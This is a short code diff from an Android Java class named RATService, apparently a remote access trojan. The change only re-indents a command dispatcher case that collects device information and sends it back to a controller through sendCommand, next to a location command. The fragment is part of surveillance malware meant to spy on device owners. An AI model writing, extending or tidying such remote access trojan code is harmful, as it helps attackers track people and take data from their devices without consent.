@@ -385,15 +385,15 @@ public class RATService extends Service {
             break;
             
         case "info":
-        case "INFO":
-        case "DEVICE_INFO":
-            if (deviceModule != null) {
-                String result = deviceModule.getDeviceInfo();
-                sendCommand("INFO|" + result);
-            } else {
-                sendCommand("INFO|ERROR: Device module not available");
-            }
-            break;
+case "INFO":
+case "DEVICE_INFO":
+    if (deviceModule != null) {
+        String result = deviceModule.getDeviceInfo();
+        sendCommand("INFO|" + result);
+    } else {
+        sendCommand("INFO|ERROR: Device module not available");
+    }
+    break;
             
         case "location":
         case "LOCATION":
